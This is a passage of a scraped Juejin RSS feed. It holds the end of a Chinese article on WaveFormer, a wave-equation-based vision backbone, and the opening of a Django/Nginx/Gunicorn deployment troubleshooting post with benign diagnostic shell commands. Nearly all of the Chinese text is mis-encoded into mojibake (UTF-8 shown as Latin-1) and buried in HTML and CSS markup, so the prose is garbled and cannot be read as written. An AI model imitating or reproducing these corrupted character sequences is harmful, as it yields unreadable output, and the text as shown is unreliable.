çš„è®ºæ–‡ï¼Œæå‡ºç”¨<strong>æ³¢åŠ¨æ–¹ç¨‹</strong>å»ºæ¨¡è§†è§‰ç‰¹å¾ï¼Œè¯•å›¾ä»ç‰©ç†å±‚é¢é‡æ„è§†è§‰è¯­ä¹‰ä¼ æ’­æ–¹å¼ã€‚è¿™æ˜¯å¦åªæ˜¯åˆä¸€ä¸ªâ€œå¬èµ·æ¥å¾ˆç¾ã€ç”¨èµ·æ¥å¾ˆéš¾â€çš„ç†è®ºå°è¯•ï¼Ÿæˆ‘ä»¬ä»Šå¤©ä»å‡ ä¸ªæ ¹æœ¬é—®é¢˜å±•å¼€åˆ†æã€‚</p>
<h2 data-id="heading-0"><strong>ä¸ºä»€ä¹ˆè§†é¢‘ / åŠ¨æ€ç†è§£è¶Šæ¥è¶Šéš¾é  Transformer ç¡¬æ‰›ï¼Ÿ</strong></h2>
<ul>
<li><strong>è®¡ç®—å¤æ‚åº¦çˆ†ç‚¸</strong></li>
</ul>
<p>Transformer æ ¸å¿ƒæ˜¯è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œå…¶è®¡ç®—å¤æ‚åº¦ä¸º O(NÂ²)ï¼Œå…¶ä¸­ N æ˜¯åºåˆ—é•¿åº¦ã€‚åœ¨è§†é¢‘ä¸­ï¼Œå¦‚æœæ¯å¸§åˆ’åˆ†ä¸ºå¤šä¸ª patchï¼Œæ—¶é—´ç»´åº¦å†å åŠ ï¼Œåºåˆ—é•¿åº¦æ€¥å‰§å¢åŠ ï¼Œå³ä½¿æ˜¯çº¿æ€§æ³¨æ„åŠ›æˆ–çª—å£æ³¨æ„åŠ›ä¼˜åŒ–ä¹Ÿéš¾ä»¥æ ¹æœ¬è§£å†³ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f008f354b69847dca376db3fb8bd9151~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778296&amp;x-signature=YquMUERxPdI33oRdmdpEh99Qv0Y%3D" alt="screenshot_2026-02-03_15-24-16.png" loading="lazy"/></p>
<ul>
<li><strong>æ—¶é—´ç»´åº¦å»ºæ¨¡è–„å¼±</strong></li>
</ul>
<p>Transformer æœ¬è´¨ä¸Šæ˜¯å¯¹åºåˆ—å»ºæ¨¡ï¼Œä½†å¯¹æ—¶é—´è¿ç»­æ€§å’ŒåŠ¨æ€æ¼”åŒ–ç¼ºä¹<strong>æ˜¾å¼ç‰©ç†å‡è®¾</strong>ã€‚è§†é¢‘ä¸­çš„è¿åŠ¨ã€å…‰æµã€æ—¶é—´ä¸€è‡´æ€§ç­‰ä¿¡æ¯ï¼Œå¦‚æœåªä¾é æ•°æ®é©±åŠ¨å­¦ä¹ ï¼Œéœ€è¦æå¤§å‚æ•°é‡å’Œæ ·æœ¬é‡ã€‚</p>
<ul>
<li><strong>é«˜é¢‘ç»†èŠ‚ä¸¢å¤±ä¸¥é‡</strong></li>
</ul>
<p>ä¼ ç»Ÿ Transformer åœ¨æ·±å±‚ç½‘ç»œä¸­å®¹æ˜“å¹³æ»‘é«˜é¢‘ä¿¡æ¯ï¼ˆå¦‚è¾¹ç¼˜ã€çº¹ç†ï¼‰ï¼Œè¿™åœ¨é™æ€å›¾åƒä¸­å°šå¯é€šè¿‡è·³è·ƒè¿æ¥ç¼“è§£ï¼Œä½†åœ¨åŠ¨æ€åœºæ™¯ä¸­ï¼Œç»†èŠ‚ä¸¢å¤±ä¼šç´¯ç§¯ï¼Œå½±å“åˆ†å‰²ã€è·Ÿè¸ªç­‰ç²¾ç»†ä»»åŠ¡ã€‚</p>
<p>è¿™äº›ç“¶é¢ˆå¹¶éé â€œå †æ›´å¤§æ¨¡å‹ã€æ›´å¤šæ•°æ®â€å°±èƒ½å½»åº•è§£å†³ï¼Œè€Œæ˜¯éœ€è¦å¼•å…¥<strong>æ–°çš„å½’çº³åç½®ä¸ä¼ æ’­æœºåˆ¶ã€‚</strong></p>
<h2 data-id="heading-1"><strong>WaveFormerï¼šæŠŠç‰¹å¾å½“ä½œâ€œæ³¢â€ï¼Œåˆ°åº•è§£å†³äº†ä»€ä¹ˆï¼Ÿ</strong></h2>
<p>WaveFormer çš„æ ¸å¿ƒæ€æƒ³æ˜¯ <strong>ï¼šå°†ç‰¹å¾å›¾è§†ä¸ºå¯åœ¨ç©ºé—´ä¸­ä¼ æ’­çš„æ³¢åŠ¨ä¿¡å·ï¼Œç”¨é˜»å°¼æ³¢åŠ¨æ–¹ç¨‹æ§åˆ¶å…¶æ¼”åŒ–ã€‚</strong> è¿™ä¸€åšæ³•åœ¨ç‰©ç†ä¸Šæ˜¯å¯è§£é‡Šçš„ï¼Œåœ¨è®¡ç®—ä¸Šæ˜¯é«˜æ•ˆçš„ï¼Œå…³é”®çªç ´åœ¨äºï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f77d3cf1c0844b959aa49974c63f7e47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778296&amp;x-signature=rbvFpF7KkMpe8118nIhTFs6fKWY%3D" alt="screenshot_2026-02-03_15-34-41.png" loading="lazy"/></p>
<ul>
<li><strong>é¢‘ç‡-æ—¶é—´è§£è€¦ï¼Œå‘Šåˆ«è¿‡åº¦å¹³æ»‘</strong></li>
</ul>
<p>ä¼ ç»Ÿçƒ­ä¼ å¯¼ç±»æ¯”å¦‚åŒâ€œæ¨¡ç³Šæ»¤é•œâ€ï¼Œé«˜é¢‘æˆåˆ†è¡°å‡è¿‡å¿«ï¼›è€Œæ³¢åŠ¨æ–¹ç¨‹ä¸­çš„æŒ¯è¡æœºåˆ¶å…è®¸é«˜ä½é¢‘æˆåˆ†å…±å­˜ï¼Œ<strong>ç»†èŠ‚å¾—ä»¥ä¿ç•™</strong>ã€‚å…¬å¼ä¸Šï¼Œå…¶é˜»å°¼é¡¹ä¸é¢‘ç‡æ— å…³ï¼ŒæŒ¯è¡é¡¹ä¸é¢‘ç‡ç›¸å…³ï¼Œå½¢æˆè§£è€¦ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04567cac248341c6875e1eaa83940085~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778296&amp;x-signature=mGE1xIQ3I9baro61uD4dsrxtLDM%3D" alt="screenshot_2026-02-03_15-35-13.png" loading="lazy"/></p>
<ul>
<li><strong>O(N log N) å¤æ‚åº¦ï¼Œå®ç°é«˜æ•ˆé•¿ç¨‹äº¤äº’</strong></li>
</ul>
<p>é€šè¿‡å‚…é‡Œå¶å˜æ¢åœ¨é¢‘åŸŸæ‰§è¡Œä¼ æ’­ï¼ŒWaveFormerÂ é¿å…äº†Â TransformerÂ çš„å¹³æ–¹å¤æ‚åº¦ï¼Œå°¤å…¶é€‚åˆé«˜åˆ†è¾¨ç‡å›¾åƒä¸è§†é¢‘å¸§ã€‚</p>
<ul>
<li><strong>ç‰©ç†å¯è§£é‡Šçš„ä¼ æ’­è¿‡ç¨‹</strong></li>
</ul>
<p>WaveFormer ä¸­çš„â€œæ³¢é€Ÿâ€å’Œâ€œé˜»å°¼â€å‚æ•°å…·æœ‰æ˜ç¡®ç‰©ç†æ„ä¹‰ï¼Œå¯é€šè¿‡å­¦ä¹ è°ƒæ•´ï¼Œé€‚åº”ä¸åŒè¯­ä¹‰çš„ä¼ æ’­éœ€æ±‚ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>ä½é€Ÿ+å¼ºé˜»å°¼</strong> â†’ å±€éƒ¨ç»“æ„ä¿æŒ</li>
<li><strong>é«˜é€Ÿ+å¼±é˜»å°¼</strong>Â â†’ å…¨å±€è¯­ä¹‰æ‰©æ•£</li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f05be70bcb644d0e93abbf6f69670b65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778296&amp;x-signature=uwOcRUOCVEKdiS6M6KrfquEaZk4%3D" alt="screenshot_2026-02-03_15-36-28.png" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>è¿™æ˜¯ä¸æ˜¯ä¸€ä¸ªâ€œçœ‹èµ·æ¥å¾ˆç¾ï¼Œä½†éš¾è½åœ°â€çš„æ–¹å‘ï¼Ÿ</strong></h2>
<p>æˆ‘ä»¬è®¤ä¸ºï¼ŒWaveFormer çš„ä»·å€¼ä¸ä»…åœ¨äºç†è®ºæ–°é¢–æ€§ï¼Œæ›´åœ¨äºå®ƒå›åº”äº†å½“å‰è§†è§‰å»ºæ¨¡çš„è‹¥å¹²æœ¬è´¨é—®é¢˜ï¼Œå¹¶åœ¨å®éªŒä¸­è¡¨ç°å‡ºå¯è½åœ°çš„æ½œåŠ›ï¼š</p>
<p>âœ… å·²éªŒè¯çš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li>åœ¨Â ImageNetã€COCOã€ADE20KÂ ä¸Šè¾¾åˆ° SOTA æˆ–ç›¸è¿‘ç²¾åº¦ï¼Œ<strong>FLOPs é™ä½ã€ååé‡æå‡</strong></li>
<li>åœ¨è¯­ä¹‰åˆ†å‰²ä»»åŠ¡ä¸­ï¼Œ<strong>è¾¹ç•Œä¿æŒæ˜æ˜¾ä¼˜äºçƒ­ä¼ å¯¼ç±»æ–¹æ³•</strong></li>
<li>æ¨¡å—å¯åµŒå…¥ç°æœ‰Â CNN / TransformerÂ æ¶æ„ï¼Œä½œä¸ºä¼ æ’­æ¨¡å—ä½¿ç”¨</li>
</ul>
<p>ğŸ”„ å¾…éªŒè¯çš„æ–¹å‘ï¼š</p>
<ul>
<li>åœ¨é•¿è§†é¢‘ç†è§£ã€å…‰æµä¼°è®¡ç­‰å¼ºæ—¶åºä»»åŠ¡ä¸­çš„è¡¨ç°</li>
<li>ä¸åŠ¨æ€å·ç§¯ã€çŠ¶æ€ç©ºé—´æ¨¡å‹ç­‰æ–°å…´æ¶æ„çš„èåˆæ½œåŠ›</li>
<li>åœ¨è¾¹ç¼˜è®¾å¤‡ä¸Šçš„å®é™…éƒ¨ç½²æ•ˆç‡</li>
</ul>
<h2 data-id="heading-3"><strong>ä»â€œç¡¬æ‰›â€åˆ°â€œå·§è§£â€ï¼šè§†è§‰å»ºæ¨¡çš„æ–°èŒƒå¼æ˜¯å¦æ­£åœ¨å½¢æˆï¼Ÿ</strong></h2>
<p>WaveFormer æš—ç¤ºäº†ä¸€ä¸ªè¶‹åŠ¿ï¼šè§†è§‰å»ºæ¨¡æ­£ä»<strong>çº¯ç²¹æ•°æ®é©±åŠ¨çš„é»‘ç®±æ¨¡å‹ï¼Œå‘ç‰©ç†å¯å‘ã€ç»“æ„å¯è§£é‡Šã€è®¡ç®—é«˜æ•ˆ</strong>çš„ç™½ç®±æ¨¡å‹è¿‡æ¸¡ã€‚æ³¢åŠ¨æ–¹ç¨‹ä¸æ˜¯å”¯ä¸€è·¯å¾„ï¼Œçƒ­ä¼ å¯¼ã€æ‰©æ•£æ¨¡å‹ã€å¼¹ç°§ç³»ç»Ÿç­‰ç‰©ç†æ¨¡å‹éƒ½å¯èƒ½å¸¦æ¥æ–°çš„æ¨¡å—è®¾è®¡ã€‚</p>
<p>å°¤å…¶å€¼å¾—å…³æ³¨çš„æ˜¯ï¼Œè¿™ç§æœºåˆ¶ä¸º<strong>å¤šé¢‘è¯­ä¹‰å»ºæ¨¡</strong>æä¾›äº†ç»Ÿä¸€æ¡†æ¶ï¼šä½é¢‘æ‰¿è½½å…¨å±€å¸ƒå±€ï¼Œé«˜é¢‘ä¿æŒç»†èŠ‚çº¹ç†ï¼Œè€Œä¼ æ’­è¿‡ç¨‹å¯æ§å¯è°ƒã€‚</p>
<h2 data-id="heading-4"><strong>æ€»ç»“</strong></h2>
<p>Transformer ä¸æ˜¯è§†è§‰çš„ç»ˆç‚¹ï¼Œå°¤å…¶åœ¨åŠ¨æ€ã€é«˜åˆ†è¾¨ç‡ã€ç»†ç²’åº¦ä»»åŠ¡ä¸­ï¼Œå…¶å±€é™æ€§æ—¥ç›Šæ˜æ˜¾ã€‚WaveFormer é€šè¿‡æ³¢åŠ¨æ–¹ç¨‹é‡æ–°æ€è€ƒç‰¹å¾ä¼ æ’­æœºåˆ¶ï¼Œåœ¨é¢‘ç‡-æ—¶é—´è§£è€¦ã€è®¡ç®—æ•ˆç‡ã€ç»†èŠ‚ä¿æŒç­‰æ–¹é¢æ˜¾ç¤ºå‡ºæ˜ç¡®ä¼˜åŠ¿ã€‚å®ƒæˆ–è®¸ä¸æ˜¯æœ€ç»ˆç­”æ¡ˆï¼Œä½†å®ƒæŒ‡å‡ºäº†ä¸€ä¸ªå€¼å¾—æ¢ç´¢çš„æ–¹å‘ï¼š<strong>è§†è§‰å»ºæ¨¡å¯ä»¥æ›´æœ‰ç‰©ç†æ„Ÿã€å¯è§£é‡Šã€é«˜æ•ˆåŒ–ã€‚</strong></p>
<p>è®ºæ–‡ä»£ç å·²å¼€æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZishanShu%2FWaveFormer" target="_blank" title="https://github.com/ZishanShu/WaveFormer" ref="nofollow noopener noreferrer">github.com/ZishanShu/Wâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»â€œæ‹’ç»è¿æ¥â€åˆ°â€œ500é”™è¯¯â€ï¼Œæˆ‘æ‰‹æŠŠæ‰‹æ’é€šäº†Djangoéƒ¨ç½²çš„å‘ğŸ¥¶]]></title>    <link>https://juejin.cn/post/7602497125268029446</link>    <guid>https://juejin.cn/post/7602497125268029446</guid>    <pubDate>2026-02-03T23:15:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602497125268029446" data-draft-id="7602211941513953334" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»â€œæ‹’ç»è¿æ¥â€åˆ°â€œ500é”™è¯¯â€ï¼Œæˆ‘æ‰‹æŠŠæ‰‹æ’é€šäº†Djangoéƒ¨ç½²çš„å‘ğŸ¥¶"/> <meta itemprop="keywords" content="Python,Linux"/> <meta itemprop="datePublished" content="2026-02-03T23:15:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sheffield"/> <meta itemprop="url" content="https://juejin.cn/user/362164852109770"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»â€œæ‹’ç»è¿æ¥â€åˆ°â€œ500é”™è¯¯â€ï¼Œæˆ‘æ‰‹æŠŠæ‰‹æ’é€šäº†Djangoéƒ¨ç½²çš„å‘ğŸ¥¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/362164852109770/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sheffield
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T23:15:09.000Z" title="Tue Feb 03 2026 23:15:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œä¸ºä¸€åè¿ç»´å…¼èœé¸Ÿå¼€å‘ï¼Œæœ¬åœ°è·‘é€šDjangoé¡¹ç›®ä¸ç®—éš¾ï¼Œä½†éƒ¨ç½²åˆ°æœåŠ¡å™¨ï¼ˆCentOS 7ï¼‰ã€æ­é…Nginx+Gunicornæ—¶ï¼Œæ€»ä¼šé‡åˆ°å„ç§å¥‡å¥‡æ€ªæ€ªçš„æŠ¥é”™â€”â€”ç›¸ä¿¡å¾ˆå¤šæ–°æ‰‹å’Œæˆ‘ä¸€æ ·ï¼Œä»â€œç½‘é¡µæ— æ³•è®¿é—®â€åˆ°â€œ500 Internal Server Errorâ€ï¼Œä¸€æ­¥æ­¥è¸©å‘ï¼Œä¸€æ­¥æ­¥æ’æŸ¥ï¼Œæœ€ç»ˆæ‰æ‰¾åˆ°é—®é¢˜æ ¹æºã€‚</p>
<p>ä»Šå¤©å°±æŠŠæˆ‘è¿™æ¬¡å®Œæ•´çš„æ’é”™ç»å†è®°å½•ä¸‹æ¥ï¼Œè¿˜åŸæ¯ä¸€ä¸ªæŠ¥é”™åœºæ™¯ã€å®æ“å‘½ä»¤å’Œæ’æŸ¥æ€è·¯ï¼Œå¸Œæœ›èƒ½å¸®åˆ°æ­£åœ¨è¢«Djangoéƒ¨ç½²æŠ˜ç£¨çš„ä½ ï¼ˆå…¨ç¨‹åŸºäºPython 3.6ã€Django 2.2/3.2ã€Nginx 1.20ã€Gunicorn 20.1.0ï¼‰ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€éƒ¨ç½²ç¯å¢ƒä¸åˆå§‹é—®é¢˜</h2>
<p>å…ˆäº¤ä»£ä¸‹æˆ‘çš„éƒ¨ç½²æ¶æ„ï¼Œç»å…¸ç»„åˆï¼š</p>
<ul>
<li>æœåŠ¡å™¨ï¼šCentOS 7</li>
<li>åç«¯ï¼šDjangoé¡¹ç›®ï¼ˆé¡¹ç›®åHealthForumï¼‰</li>
<li>WSGIæœåŠ¡å™¨ï¼šGunicornï¼ˆç›‘å¬127.0.0.1:8000ï¼‰</li>
<li>åå‘ä»£ç†ï¼šNginxï¼ˆç›‘å¬80ç«¯å£ï¼Œè½¬å‘è¯·æ±‚åˆ°Gunicornçš„8000ç«¯å£ï¼‰</li>
<li>ä¾èµ–ï¼šMySQLï¼ˆæ•°æ®åº“ï¼‰ã€Redisï¼ˆç¼“å­˜/ä¼šè¯ï¼‰</li>
</ul>
<p>æœ¬åœ°å¼€å‘ç¯å¢ƒä¸€åˆ‡æ­£å¸¸ï¼Œä»£ç ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€é…ç½®å¥½Nginxå’ŒGunicornåï¼Œè®¿é—®ç½‘é¡µåªæ˜¾ç¤ºâ€œ500 Internal Server Errorâ€ï¼Œç”¨curlè®¿é—®ä¹Ÿæç¤ºå¼‚å¸¸â€”â€”è¿™å°±æ˜¯æˆ‘æ’é”™çš„å¼€å§‹ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ’é”™å…¨è¿‡ç¨‹ï¼šä»â€œç½‘ç»œå±‚â€åˆ°â€œåº”ç”¨å±‚â€é€æ­¥æ‹†è§£</h2>
<p>æ’é”™çš„æ ¸å¿ƒæ€è·¯ï¼š<strong>ä»å¤–å‘å†…ï¼Œé€æ­¥ç¼©å°èŒƒå›´</strong>â€”â€”å…ˆç¡®è®¤Nginxæ˜¯å¦æ­£å¸¸ï¼Œå†éªŒè¯Gunicornæ˜¯å¦èƒ½æ¥æ”¶è¯·æ±‚ï¼Œæœ€åæ’æŸ¥Djangoåº”ç”¨å†…éƒ¨é”™è¯¯ï¼Œé¿å…ç›²ç›®ä¿®æ”¹é…ç½®ã€‚</p>
<h3 data-id="heading-2">é˜¶æ®µ1ï¼šæŠ¥é”™â€œæ‹’ç»è¿æ¥â€ï¼ŒGunicornæ ¹æœ¬æ²¡æ­£å¸¸ç›‘å¬ç«¯å£</h3>
<p>æœ€å¼€å§‹ï¼Œæˆ‘ç”¨curlæœ¬åœ°è®¿é—®Gunicornçš„8000ç«¯å£ï¼Œç›´æ¥æŠ¥é”™ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">[root@server ~]<span class="hljs-meta"># curl -v http:<span class="hljs-comment">//127.0.0.1:8000</span></span>
* <span class="hljs-function">About to <span class="hljs-title">connect</span><span class="hljs-params">()</span> to 127.0.0.1 port 8000 <span class="hljs-params">(#<span class="hljs-number">0</span>)</span>
*   Trying 127.0.0.1...
* æ‹’ç»è¿æ¥
* Failed connect to 127.0.0.1:<span class="hljs-number">8000</span>;</span> æ‹’ç»è¿æ¥
* Closing connection <span class="hljs-number">0</span>
curl: (<span class="hljs-number">7</span>) Failed connect to <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>; æ‹’ç»è¿æ¥
</code></pre>
<p>ç¬¬ä¸€ååº”ï¼šGunicornæ²¡å¯åŠ¨ï¼Ÿæˆ–è€…ç«¯å£æ²¡ç›‘å¬ï¼Ÿ</p>
<p>ç”¨sså‘½ä»¤æŸ¥çœ‹8000ç«¯å£ç›‘å¬çŠ¶æ€ï¼Œå‘ç°æ²¡æœ‰ä»»ä½•è¾“å‡ºï¼ˆè¯´æ˜æ— è¿›ç¨‹ç›‘å¬8000ç«¯å£ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@server ~</span>]<span class="hljs-meta"># ss -lntp | grep 8000</span>
</code></pre>
<p>å†æŸ¥çœ‹Gunicornè¿›ç¨‹ï¼Œå‘ç°è¿›ç¨‹å­˜åœ¨ï¼Œä½†ç«¯å£å°±æ˜¯æ²¡ç›‘å¬â€”â€”è¿™æ—¶å€™æ‰æ„è¯†åˆ°ï¼Œ<strong>è¿›ç¨‹å­˜åœ¨â‰ æ­£å¸¸ç›‘å¬</strong>ï¼Œå¤§æ¦‚ç‡æ˜¯Gunicornå¯åŠ¨åéšæ€§é—ªé€€äº†ã€‚</p>
<h4 data-id="heading-3">æ’æŸ¥1ï¼šæŸ¥çœ‹Gunicorné”™è¯¯æ—¥å¿—ï¼Œå‘ç°â€œæ¨¡å—æ‰¾ä¸åˆ°â€</h4>
<p>æŸ¥çœ‹Gunicornçš„é”™è¯¯æ—¥å¿—ï¼ˆè·¯å¾„/var/log/gunicorn/error.logï¼‰ï¼Œå‘ç°äº†å…³é”®æŠ¥é”™ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">ModuleNotFoundError:</span> No <span class="hljs-keyword">module</span> named <span class="hljs-comment">'HealthForum'</span>
</code></pre>
<p>åŸæ¥ï¼æˆ‘å¯åŠ¨Gunicornæ—¶ï¼Œ<strong>æ²¡åˆ‡æ¢åˆ°Djangoé¡¹ç›®æ ¹ç›®å½•</strong> ï¼ˆé¡¹ç›®æ ¹ç›®å½•æ˜¯/code/HealthForum/ï¼Œé‡Œé¢æœ‰manage.pyå’ŒHealthForumå­æ–‡ä»¶å¤¹ï¼‰ï¼Œå¯¼è‡´Pythonæ— æ³•è¯†åˆ«é¡¹ç›®æ¨¡å—ï¼ŒGunicornå¯åŠ¨åç«‹åˆ»é—ªé€€ï¼Œç«¯å£è‡ªç„¶æ— æ³•ç›‘å¬ã€‚</p>
<h4 data-id="heading-4">è§£å†³1ï¼šåˆ‡æ¢åˆ°æ­£ç¡®ç›®å½•ï¼Œé‡å¯Gunicorn</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 1. æ¸…ç†æ®‹ç•™çš„Gunicornè¿›ç¨‹</span>
<span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> $(ps -ef | <span class="hljs-keyword">grep</span> gunicorn | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">'{print $2}'</span>)

